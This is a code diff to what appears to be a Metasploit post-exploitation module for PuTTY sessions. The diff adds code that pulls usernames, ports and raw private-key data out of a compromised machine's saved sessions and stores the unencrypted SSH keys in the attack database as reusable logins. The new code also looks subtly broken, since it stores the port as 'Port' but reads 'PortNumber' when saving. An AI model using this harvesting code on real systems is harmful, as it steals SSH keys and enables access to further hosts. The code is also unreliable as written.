@@ -174,11 +174,14 @@ class Metasploit3 < Msf::Post
           # Now analyse the private key
           private_key = {}
           private_key['Name'] = ses['Name']
+          private_key['Port'] = ses['PortNumber']
+          private_key['UserName'] = ses['UserName']
           private_key['HostName'] = ses['HostName']
           private_key['PublicKeyFile'] = ses['PublicKeyFile']
           private_key['Type'] = ''
           private_key['Cipher'] = ''
           private_key['Comment'] = ''
+          private_key['KeyData'] = ppk
 
           # Get type of key
           if ppk.to_s =~ /^SSH PRIVATE KEY FILE FORMAT 1.1/
@@ -215,6 +218,43 @@ class Metasploit3 < Msf::Post
     private_key_summary
   end
 
+  def store_private_key_in_db(username,host,port,key)
+    service_data = { 
+      address: host,
+      port: port,
+      service_name: 'ssh',
+      protocol: 'tcp',
+      workspace_id: myworkspace_id,
+    }   
+
+    credential_data = { 
+      origin_type: :session,
+      session_id: session_db_id,
+      post_reference_name: refname,
+      username: username,
+      realm: nil,
+      realm_key: nil,
+      auth_methods: ['publickey'],
+      key_data: key
+    }   
+
+    credential_data.merge!(service_data)
+
+    # Create the Metasploit::Credential::Core object
+    credential_core = create_credential(credential_data)
+    status = Metasploit::Model::Login::Status::UNTRIED
+
+    # Assemble the options hash for creating the Metasploit::Credential::Login object
+    login_data = { 
+      core: credential_core,
+      status: status
+    }   
+
+    # Merge in the service data and create our Login
+    login_data.merge!(service_data)
+    create_credential_login(login_data)
+  end
+
   # Entry point
   def run
     # Look for saved sessions, break out if not.
@@ -237,6 +277,11 @@ class Metasploit3 < Msf::Post
       if (!private_key_info.nil? && !private_key_info.empty?)
         print_line
         display_private_key_analysis(private_key_info) 
+        
+        # Store unencrypted keys in the DB
+        private_key_info.each do |ses|
+           store_private_key_in_db(ses['UserName'],ses['HostName'],ses['PortNumber'],ses['KeyData']) if ses['Cipher']=='none'
+        end
       end
     end
 
